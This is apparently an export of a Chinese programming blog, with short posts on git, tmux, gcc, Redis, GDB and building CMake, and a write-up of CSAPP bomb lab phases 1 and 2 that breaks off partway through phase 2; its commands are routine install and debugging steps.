<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global alias.co checkout</span><br><span class="line">git config --global alias.br branch</span><br><span class="line">git config --global alias.ci commit</span><br><span class="line">git config --global alias.st status</span><br><span class="line">git config --global alias.unstage &#x27;reset HEAD --&#x27;</span><br><span class="line">git config --global alias.last &#x27;log -1 HEAD&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>《Pro Git》第2版： <a href="https://www.progit.cn">https://www.progit.cn</a></p>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>tmux常用操作</title>
    <url>/2020/05/04/2020-05-04-tmux-cheetsheet/</url>
    <content><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>TMUX指<strong>terminal multiplexer</strong>，即终端复用软件。tmux结构包含以下三个部分：</p>
<ul>
<li><strong>session</strong>  —— 会话，可以用tmux创建多个会话。</li>
<li><strong>window</strong>  —— 窗口， 一个会话中可以包含多个窗口。</li>
<li><strong>pane</strong>       —— 窗格，用于分隔窗口，一个窗口中可以包含多个窗格。</li>
</ul>
<span id="more"></span>

<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install tmux</span><br></pre></td></tr></table></figure>

<h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p><font color = 'red'><strong>说明：</strong>&lt;C-b&gt; 指 Ctrl+b键; &lt;C-b&gt; d指先按Ctrl+b键, 再按d键，不是指同时按下Ctrl+b和d</font></p>
<h4 id="session操作"><a href="#session操作" class="headerlink" title="session操作"></a>session操作</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tmux new -s &lt;session&gt;					#创建新会话</span><br><span class="line">tmux new -s &lt;session&gt; -d				#后台创建会话</span><br><span class="line">tmux ls									#列出所有会话</span><br><span class="line">tmux a -t &lt;session&gt;						#回到某个会话,a指attach</span><br><span class="line">tmux rename -t &lt;old_name&gt; &lt;new_name&gt;	#将指定会话改名</span><br><span class="line">tmux kill-session -t &lt;session&gt;			#关闭某个会话</span><br><span class="line">tmux kill-server						#重启所有tmux进程</span><br><span class="line">&lt;C-b&gt; d									#暂时离开tmux,回到终端,d指detach</span><br><span class="line">&lt;C-b&gt; s									#选择会话列表</span><br><span class="line">&lt;C-b&gt; $									#重命名当前会话</span><br></pre></td></tr></table></figure>

<h4 id="window操作"><a href="#window操作" class="headerlink" title="window操作"></a>window操作</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;C-b&gt; w									#列出所有窗口</span><br><span class="line">&lt;C-b&gt; &lt;C-o&gt;								#切换窗口顺序</span><br><span class="line">&lt;C-b&gt; 0-9								#选择几号窗口</span><br><span class="line">&lt;C-b&gt; p									#切换上一个窗口, p指previous</span><br><span class="line">&lt;C-b&gt; n									#切换下一个窗口, n指next</span><br><span class="line">&lt;C-d&gt;									#退出tmux窗口, 相当于敲exit</span><br><span class="line">&lt;C-b&gt; &amp;									#退出当前窗口, 关闭所有窗格</span><br><span class="line">&lt;C-b&gt; ,									#给窗口改名</span><br></pre></td></tr></table></figure>

<h4 id="pane操作"><a href="#pane操作" class="headerlink" title="pane操作"></a>pane操作</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;C-b&gt; %									#纵向分隔窗口</span><br><span class="line">&lt;C-b&gt; &quot; 								#横向分隔窗口</span><br><span class="line">&lt;C-b&gt; &lt;Up/Down/Left/Right&gt;				#方向键切换窗格，可通过配置改成HJKL</span><br><span class="line">&lt;C-b&gt; z									#最大化当前窗格</span><br><span class="line">&lt;C-b&gt; x									#关闭当前使用中的窗格</span><br><span class="line">&lt;C-b&gt; q									#显示序号,在序号消失前按对应序号可切换到对应窗格</span><br><span class="line">&lt;C-b&gt; o									#顺时针切换窗口</span><br><span class="line">&lt;C-b&gt; &lt;C-o&gt;								#逆时针切换窗口</span><br></pre></td></tr></table></figure>

<h4 id="上下滚动，查看历史"><a href="#上下滚动，查看历史" class="headerlink" title="上下滚动，查看历史"></a>上下滚动，查看历史</h4><p>先按<C-b>, 再按[键，进入复制模式后，用PgUp, PgDn查看历史，再按q退出。</p>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>添加~&#x2F;.tmux.conf，修改内容如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">定义快捷键&lt;C-b&gt; r, 快速加载tmux配置文件</span></span><br><span class="line">bind r source-file ~/.tmux.conf \; display &quot;tmux.conf reload!&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">适应VIM操作，上下左右改为h,j,k,l</span></span><br><span class="line">bind h select-pane -L</span><br><span class="line">bind j select-pane -D</span><br><span class="line">bind k select-pane -U</span><br><span class="line">bind l select-pane -R</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更改横分屏，竖分屏键位</span></span><br><span class="line">bind | split-window -h</span><br><span class="line">bind - split-window -v</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置窗口、窗格起始序号为1</span></span><br><span class="line">set -g base-index 1</span><br><span class="line">set -g pane-base-index 1</span><br></pre></td></tr></table></figure>

<h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><p>TMUX常用快捷键和问题 —— <a href="https://www.cnblogs.com/piperck/p/4992159.html">https://www.cnblogs.com/piperck/p/4992159.html</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>使用git rebase合并多条commit记录</title>
    <url>/2020/05/04/2020-05-04-use-git-rebase-to-merge-multi-commits/</url>
    <content><![CDATA[<h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><p><strong>首先用git log命令查看历史提交记录</strong>，示例git仓信息如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">log</span> --pretty=oneline</span></span><br><span class="line">f70c5a84996c05511d3f98034d56ca05706d62f8 (HEAD -&gt; test) fourth commit</span><br><span class="line">56a79bb29da6e483fc6de6e8f271e1a5dcba52a5 third commit</span><br><span class="line">64db6fddd02a04194b3ca22e91dd1de23f9f81d7 second commit</span><br><span class="line">783795e5285155f37c10b72ec9160e554c198ae0 first commit</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>比如这里希望合并本地的前三条记录(f70c, 56a7, 64db)，<strong>需找到待合并记录(64db)的前一条记录的commitID(7837)，作为git rebase -i命令的参数</strong>。</p>
<p><strong>输入git rebase -i 7837, 进入历史提交的编辑界面：</strong><br><img src="/2020/05/04/2020-05-04-use-git-rebase-to-merge-multi-commits/image1.png"></p>
<p>需要注意的是，上图显示的提交顺序与git log是相反的。<strong>将除了第一行的pick都改成squash, 保存退出(:wq)</strong>,再将commit信息改成merge three commit, 保存退出，再次使用git log查看：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">log</span> --pretty=oneline</span></span><br><span class="line">f448ac261c7e26682935201244eda0e9d93fd307 (HEAD -&gt; test) merge three commits</span><br><span class="line">783795e5285155f37c10b72ec9160e554c198ae0 first commit</span><br></pre></td></tr></table></figure>

<p>发现f70c, 56a7, 64db三条本地记录已经被成功合并为一条新记录。</p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul>
<li><p><font color='red'><strong>只对从未推送至公共仓库的提交记录执行git rebase</strong></font></p>
</li>
<li><p>原因可参考<a href = "https://www.progit.cn/">https://www.progit.cn/</a>  “Git分支 -&gt; 变基的风险”，该小节详细讲述了在一个公共仓库执行变基操作的问题。</p>
</li>
</ul>
<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href = "https://www.progit.cn/">https://www.progit.cn/  </a></p>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>64位Linux机器上使用gcc编译32位程序</title>
    <url>/2020/05/31/2020-05-31-complie-32-bit-program-on-64-bit-env/</url>
    <content><![CDATA[<h2 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h2><p>安装以下软件包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install build-essential module-assistant gcc-multilib g++-multilib</span><br></pre></td></tr></table></figure>
<h2 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a>Centos</h2><p>安装以下软件包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install glibc-devel.i686 libstdc++-devel.i686</span><br></pre></td></tr></table></figure>

<p>gcc编译添加-m32参数，如</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -m32 main.c</span><br></pre></td></tr></table></figure>
<span id="more"></span>


<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://notes.maxwi.com/2017/12/06/compile-x32-executable-at-x64-linux-system/">http://notes.maxwi.com/2017/12/06/compile-x32-executable-at-x64-linux-system/</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>gcc</tag>
      </tags>
  </entry>
  <entry>
    <title>如何安装和启动Redis</title>
    <url>/2020/06/01/2020-06-01-how-to-install-and-run-redis/</url>
    <content><![CDATA[<h2 id="一、源码安装redis"><a href="#一、源码安装redis" class="headerlink" title="一、源码安装redis"></a>一、源码安装redis</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">0.官网下载最新redis源码包</span></span><br><span class="line">wget http://download.redis.io/releases/redis-5.0.5.tar.gz</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1.将redis.tar.gz拷贝到/usr/local目录并解压</span></span><br><span class="line">mkdir -p /usr/local/ &amp;&amp; cd /usr/local</span><br><span class="line">cp /path/to/redis-5.0.5.tar.gz .</span><br><span class="line">tar -zxvf redis-5.0.5.tar.gz</span><br><span class="line">mv redis-5.0.5 redis &amp;&amp; cd redis</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2.编译、测试、安装</span></span><br><span class="line">make -j4 						# 编译</span><br><span class="line">make test						# 测试，显示All tests passed without errors</span><br><span class="line">make install					# 安装</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<h2 id="二、启动和停止redis"><a href="#二、启动和停止redis" class="headerlink" title="二、启动和停止redis"></a>二、启动和停止redis</h2><h3 id="通过命令行启动redis"><a href="#通过命令行启动redis" class="headerlink" title="通过命令行启动redis"></a>通过命令行启动redis</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-server 								#直接启动</span><br><span class="line">redis-server --port 6380					#自定义端口号启动，--port指定端口为6380</span><br><span class="line">redis-server /usr/local/redis/redis.conf    #启动redis时指定配置文件</span><br></pre></td></tr></table></figure>
<h3 id="通过初始化脚本启动redis"><a href="#通过初始化脚本启动redis" class="headerlink" title="通过初始化脚本启动redis"></a>通过初始化脚本启动redis</h3><ul>
<li><p>在redis源码路径的utils目录中找到初始化脚本redis_init_script, 将该脚本复制到&#x2F;etc&#x2F;init.d，文件名改为redis_端口号(如redis_6379)，脚本中修改REDISPORT变量为该端口号(如6379)</p>
</li>
<li><p>建立需要的目录， 新键&#x2F;etc&#x2F;redis目录用于存放redis配置文件，新建&#x2F;var&#x2F;redis&#x2F;端口号(如&#x2F;var&#x2F;redis&#x2F;6379)目录存放redis持久化文件</p>
</li>
<li><p>修改配置文件，将redis.conf复制到&#x2F;etc&#x2F;redis下，并改名为端口号.conf(如6379.conf)，需要修改部分参数，如下表</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>参数</th>
<th>值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>daemonize</td>
<td>yes</td>
<td>以守护模式运行redis</td>
</tr>
<tr>
<td>pidfile</td>
<td>&#x2F;var&#x2F;run&#x2F;redis_端口号.pid</td>
<td>设置redis的PID文件位置</td>
</tr>
<tr>
<td>port</td>
<td>端口号</td>
<td>设置redis监听的端口号，如6379</td>
</tr>
<tr>
<td>dir</td>
<td>&#x2F;var&#x2F;redis&#x2F;端口号</td>
<td>设置持久化文件存放位置</td>
</tr>
</tbody></table>
<h3 id="设置redis随系统自启动-Centos"><a href="#设置redis随系统自启动-Centos" class="headerlink" title="设置redis随系统自启动(Centos)"></a>设置redis随系统自启动(Centos)</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chkconfig --add redis_6379 		#增加redis服务，并通过chkconfig管理</span><br><span class="line">chkconfig redis_6379 on 		#开启服务</span><br><span class="line">chkconfig --list 				#查看redis服务级别，默认2，3，4，5为ON表示成功开启</span><br></pre></td></tr></table></figure>
<h3 id="停止redis"><a href="#停止redis" class="headerlink" title="停止redis"></a>停止redis</h3><p>强行终止redis可能导致数据丢失，正确停止redis方式是发送SHUTDOWN命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli SHUTDOWN</span><br></pre></td></tr></table></figure>
<p>redis收到SHUTDOWN命令后，会先断开所有客户端连接，然后根据配置执行持久化，最后退出<br>redis可以妥善处理SIGTERM信号，所以使用kill redis进程的PID也可以正常结束redis</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1]《Redis入门指南 第2版》<br>[2] redis安装教程：<a href="https://blog.csdn.net/qq_36737803/article/details/90578860">https://blog.csdn.net/qq_36737803&#x2F;article&#x2F;details&#x2F;90578860</a></p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>GDB加载so库符号失败的解决方法</title>
    <url>/2020/06/21/2020-06-21-how-to-solve-gdb-load-so-failure/</url>
    <content><![CDATA[<h2 id="问题现象"><a href="#问题现象" class="headerlink" title="问题现象"></a>问题现象</h2><p>gdb调试core文件或进程时，出现加载so库符号失败，错误信息如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">warning: Could not load shared library symbols for ../libadd.so</span><br><span class="line">Do you need &quot;set solib-search-path&quot; or &quot;set sysroot&quot;?</span><br></pre></td></tr></table></figure>
<p>执行<strong>info sharedlibrary</strong>，查看Syms Read字段为No,  表示对应so库符号加载失败。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">pwd</span> /home/gdb</span></span><br><span class="line">(gdb) info sharedlibrary</span><br><span class="line">From                To                  Syms Read   Shared Object Library</span><br><span class="line">0x00007fba2c572570  0x00007fba2c57267b  No          ../libadd.so</span><br><span class="line">0x00007fba2c370570  0x00007fba2c37066b  No          ../../var/libsub.so</span><br><span class="line">(gdb) bt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">0  0x00007fba2c57266b <span class="keyword">in</span> ?? ()</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1  0x00007ffc6f703ff0 <span class="keyword">in</span> ?? ()</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>


<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>设置gdb的<strong>solib-search-path</strong>选项， 指定加载失败的so的搜索路径即可。</p>
<p>solib-search-path可以指定多个路径。在linux上，路径之间用冒号分隔，命令如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) set solib-search-path /var:/home</span><br><span class="line">Reading symbols from ../libadd.so...done.</span><br><span class="line">Loaded symbols for ../libadd.so</span><br><span class="line">Reading symbols from ../../var/libsub.so...done.</span><br><span class="line">Loaded symbols for ../../var/libsub.so</span><br><span class="line">(gdb) info sharedlibrary</span><br><span class="line">From                To                  Syms Read   Shared Object Library</span><br><span class="line">0x00007fba2c572570  0x00007fba2c57267b  Yes         ../libadd.so</span><br><span class="line">0x00007fba2c370570  0x00007fba2c37066b  Yes         ../../var/libsub.so</span><br><span class="line">(gdb) bt</span><br><span class="line">#0  0x00007fba2c57266b in add (a=1, b=2) at add.c:5</span><br><span class="line">#1  0x0000000000400600 in ?? ()</span><br></pre></td></tr></table></figure>

<p>或者设置gdb的<strong>solib-absolute-prefix</strong>选项，指定被搜索so文件路径的前缀， 与solib-search-path区别在于solib-absolute-prefix只能有一个，使用如下gdb指令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) set solib-absolute-prefix /</span><br><span class="line">(gdb) set sysroot /					# sysroot是solib-absolute-prefix的别名</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://visualgdb.com/gdbreference/commands/set_solib-search-path">https://visualgdb.com/gdbreference/commands/set_solib-search-path</a></p>
]]></content>
      <categories>
        <category>GDB</category>
      </categories>
      <tags>
        <tag>GDB</tag>
      </tags>
  </entry>
  <entry>
    <title>源码编译并安装CMake</title>
    <url>/2020/07/26/2020-07-26-how-to-compile-and-install-cmake/</url>
    <content><![CDATA[<p>从官网安装指定版本， 以<code>3.12.1</code>版本为例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://cmake.org/files/v3.12/cmake-3.12.1.tar.gz</span><br><span class="line">tar -zxvf cmake-3.12.1.tar.gz</span><br><span class="line">cd cmake-3.12.1</span><br><span class="line">./bootstrap</span><br><span class="line">make -j8</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<p>查看cmake版本，检查是否安装成功</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cmake --version</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CMake</category>
      </categories>
      <tags>
        <tag>CMake</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP 二进制炸弹实验</title>
    <url>/2020/07/26/2020-07-26-csapp-bomblab/</url>
    <content><![CDATA[<h3 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h3><p>二进制炸弹是一个作为目标代码提供的程序。运行时提示用户输入6个不同的字符串，如其中一个字符串不正确，炸弹会引爆并打印一条错误信息。需要通过反汇编确定输入的6个字符串，从而拆除炸弹。</p>
<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul>
<li>汇编语言基础</li>
<li>GDB和OBJDUMP工具的使用</li>
</ul>
<span id="more"></span>

<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>Centos7 x86_64</p>
<h3 id="获取二进制炸弹"><a href="#获取二进制炸弹" class="headerlink" title="获取二进制炸弹"></a>获取二进制炸弹</h3><p>首先从CSAPP官网获取二进制炸弹<code>bomb.tar</code>:  <a href="http://csapp.cs.cmu.edu/3e/labs.html">http://csapp.cs.cmu.edu/3e/labs.html</a></p>
<p>在linux下执行<code>tar xvf bomb.tar</code>，得到二进制炸弹的文件，文件列表如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|-- bomb		# 二进制炸弹，x86-64位</span><br><span class="line">|-- bomb.c		# 主程序，逻辑是接受用户输入的6个字符串，并判断每个字符串是否正确。如果正确，调用phase_defused进入下一关，否则调用explode_bomb引爆炸弹</span><br></pre></td></tr></table></figure>

<h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><h4 id="1-首先理解main函数执行过程"><a href="#1-首先理解main函数执行过程" class="headerlink" title="1. 首先理解main函数执行过程"></a>1. 首先理解main函数执行过程</h4><p>反汇编炸弹，使用<code>objdump -d bomb &gt; bomb.txt</code>命令，内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400da0 &lt;main&gt;:</span><br><span class="line">  400da0:   53                      push   %rbx</span><br><span class="line">  ......</span><br><span class="line">  400e19:   e8 84 05 00 00          callq  4013a2 &lt;initialize_bomb&gt;</span><br><span class="line">  400e1e:   bf 38 23 40 00          mov    $0x402338,%edi</span><br><span class="line">  400e23:   e8 e8 fc ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  400e28:   bf 78 23 40 00          mov    $0x402378,%edi</span><br><span class="line">  400e2d:   e8 de fc ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  400e32:   e8 67 06 00 00          callq  40149e &lt;read_line&gt; # 接受用户输入的字符串，保存到%rax寄存器</span><br><span class="line">  400e37:   48 89 c7                mov    %rax,%rdi		  # 用户输入的字符串保存在$rdi寄存器，并作为phase_1函数的第一个入参传递</span><br><span class="line">  400e3a:   e8 a1 00 00 00          callq  400ee0 &lt;phase_1&gt;	  # 调用phase_1(), 执行第一关代码</span><br><span class="line">  400e3f:   e8 80 07 00 00          callq  4015c4 &lt;phase_defused&gt;</span><br></pre></td></tr></table></figure>

<p>查看<code>0x400e32</code>处的代码： 主程序调用<code>read_line</code>接收用户输入的字符串，保存到<code>$rax</code>，并且将该字符串作为函数入参传递给<code>phase_1</code>，执行第一阶段的代码。</p>
<p><font color = 'red'><strong>这里需要理解x86-64的过程调用规则：</strong></font>（关于过程调用，可参考《CSAPP原书第三版》3.7小节 —— 过程）</p>
<ul>
<li>函数调用中，<strong>利用<code>%rax</code>寄存器保存返回值。</strong></li>
<li>关于参数传递 , <strong>如果函数参数不超过6个，会依次通过<code>%rdi</code>,<code> %rsi</code>, <code>%rdx</code>, <code>%rcx</code>, <code>%r8</code>, <code>%r9</code>传递； 如超过6个参数，超出的参数利用栈传递。</strong></li>
<li><code>%rbx, %rbp, %r12~%15</code>被划分为<strong>被调用者保存寄存器</strong>；其余的寄存器，除了栈指针<code>%rsp</code>，都被划分为<strong>调用者保存寄存器</strong>。</li>
</ul>
<h4 id="2-理解phase-1执行过程"><a href="#2-理解phase-1执行过程" class="headerlink" title="2. 理解phase_1执行过程"></a>2. 理解phase_1执行过程</h4><p>查看<code>phase_1</code>的代码，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:   48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">  400ee4:   be 00 24 40 00          mov    $0x402400,%esi 			  # $esi作为strings_not_equal函数的第二个参数传递</span><br><span class="line">  400ee9:   e8 4a 04 00 00          callq  401338 &lt;strings_not_equal&gt; # 调用strings_not_equal函数，比较用户输入的字符串($rdi)和$esi处的字符串是否相等</span><br><span class="line">  400eee:   85 c0                   test   %eax,%eax 				  # 判断%eax的值是否为0</span><br><span class="line">  400ef0:   74 05                   je     400ef7 &lt;phase_1+0x17&gt; 	  # 如%eax等于0，跳转到400ef7,正常退出</span><br><span class="line">  400ef2:   e8 43 05 00 00          callq  40143a &lt;explode_bomb&gt; 	  # 如%eax不等于0，炸弹爆炸</span><br><span class="line">  400ef7:   48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">  400efb:   c3                      retq</span><br></pre></td></tr></table></figure>

<p><code>phase_1</code>执行过程如下：</p>
<ul>
<li>首先通过<code>callq</code>指令调用<code>strings_not_equal</code>函数。根据过程调用的规则，可以确定这个函数接受2个参数。第一个参数是<code>%rdi</code>, 上面分析过，是我们拆弹时输入的字符串；第二个参数是<code>$esi</code>，值为<code>0x402400</code>。顾名思义，<code>strings_not_equal</code>函数用来判断两个字符串是否相等。</li>
<li>接着用<code>test</code>指令判断函数的返回值是否为0。如果为0进行跳转并返回，调用<code>phase_defused</code>拆除炸弹，否则通过<code>callq</code>指令调用<code>explode_bomb</code>，引爆炸弹。</li>
</ul>
<p>因此，拆弹的关键在于，确认<code>0x402400</code>地址处的字符串是什么。只需要在<code>0x400ee9</code>处打个gdb断点就可以了。</p>
<h4 id="3-gdb调试炸弹"><a href="#3-gdb调试炸弹" class="headerlink" title="3. gdb调试炸弹"></a>3. gdb调试炸弹</h4><p>执行<code>gdb bomb</code>, 设置断点<code>b *0x400ee9</code>,  执行<code>run</code>。 此时程序会要求用户输入字符串，先随便输一个字符串使程序运行到我们设置的断点 <code>0x400ee9</code>处，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># gdb bomb</span><br><span class="line">(gdb) b *0x400ee9							# 设置断点， b相当于break</span><br><span class="line">Breakpoint 1 at 0x400ee9</span><br><span class="line">(gdb) r										# 运行程序， r相当于run</span><br><span class="line">Starting program: /home/pc/CSAPP/bomb/bomb</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">123											# 随便输入一个字符串，让程序运行到断点0x400ee9</span><br><span class="line">Breakpoint 1, 0x0000000000400ee9 in phase_1 ()</span><br><span class="line">(gdb) p (char *)$rdi						# $rdi保存用户输入字符串，为123，与x/s $rdi指令等价</span><br><span class="line">$2 = 0x603780 &lt;input_strings&gt; &quot;123&quot;</span><br><span class="line">(gdb) x/s $esi								# 查看esi处字符串，这就是第一关的答案</span><br><span class="line">$1 = 0x402400 &quot;Border relations with Canada have never been better.&quot;</span><br></pre></td></tr></table></figure>

<p>查看<code>%esi</code>处字符串, 即第一关的答案，如下：</p>
<p><code>Border relations with Canada have never been better.</code></p>
<p>用<code>quit</code>指令退出gdb, 新建一个文件<code>answer</code>，将答案写入该文件。重新执行<code>bomb</code>程序，指定<code>answer</code>文件名作为参数，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ./bomb answer</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">Phase 1 defused. How about the next one?</span><br></pre></td></tr></table></figure>

<p>显示<code>Phase 1 defused</code>, 表示第一关已成功通过。</p>
<h4 id="几个调试汇编代码相关的GDB指令"><a href="#几个调试汇编代码相关的GDB指令" class="headerlink" title="几个调试汇编代码相关的GDB指令"></a>几个调试汇编代码相关的GDB指令</h4><p>使用<code>disassemble</code>指令查看汇编代码，箭头表示下一步即将执行的汇编指令。</p>
<p><code>si</code>指令用于单步执行汇编代码，相当于<code>stepi</code></p>
<p><code>ni</code>指令以函数调用为单位进行单步执行， 相当于<code>nexti</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble</span><br><span class="line">Dump of assembler code for function phase_1:</span><br><span class="line">   0x0000000000400ee0 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   0x0000000000400ee4 &lt;+4&gt;:     mov    $0x402400,%esi</span><br><span class="line">=&gt; 0x0000000000400ee9 &lt;+9&gt;:     callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   0x0000000000400eee &lt;+14&gt;:    test   %eax,%eax</span><br><span class="line">   0x0000000000400ef0 &lt;+16&gt;:    je     0x400ef7 &lt;phase_1+23&gt;</span><br><span class="line">   0x0000000000400ef2 &lt;+18&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400ef7 &lt;+23&gt;:    add    $0x8,%rsp</span><br><span class="line">   0x0000000000400efb &lt;+27&gt;:    retq</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>更多用法参考<code>gdb</code>手册或《CSAPP 原书第3版》3.10.2小节 —— 使用GDB调试器</p>
<h4 id="拆弹小技巧"><a href="#拆弹小技巧" class="headerlink" title="拆弹小技巧"></a>拆弹小技巧</h4><ul>
<li><p>查看<code>bomb</code>符号表或者直接查看汇编代码，会发现有个<code>explode_bomb</code>符号，该函数用来引爆炸弹。</p>
</li>
<li><p>调试时可以对该函数设置断点，在拆弹失败时暂停运行，不让其爆炸，便于调试。可使用 <code>b explode_bomb</code>指令设置断点</p>
</li>
</ul>
<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>先贴出第二关<code>phase_2</code>的部分汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:   55                      push   %rbp</span><br><span class="line">  400efd:   53                      push   %rbx</span><br><span class="line">  400efe:   48 83 ec 28             sub    $0x28,%rsp</span><br><span class="line">  400f02:   48 89 e6                mov    %rsp,%rsi	# %rsi作为read_six_numbers的第二个入参传递, $rsp既是入参也是出参；第一个入参为$rdi, 即用户输入的字符串</span><br><span class="line">  400f05:   e8 52 05 00 00          callq  40145c &lt;read_six_numbers&gt; # 读六个数字</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure>

<p><code>phase_2</code>程序先调用<code>read_six_numbers</code>。该函数接受两个参数，第一个参数为<code>$rdi</code>, 即我们输入的字符串；第二个参数为<code>$rsp</code>, <code>$rsp</code>既是入参也是出参，用于保存<code>read_six_numbers</code>函数解析<code>$rdi</code>后得到的6个整数。想得到这个结论，需要分析<code>read_six_numbers</code>代码，如下：</p>
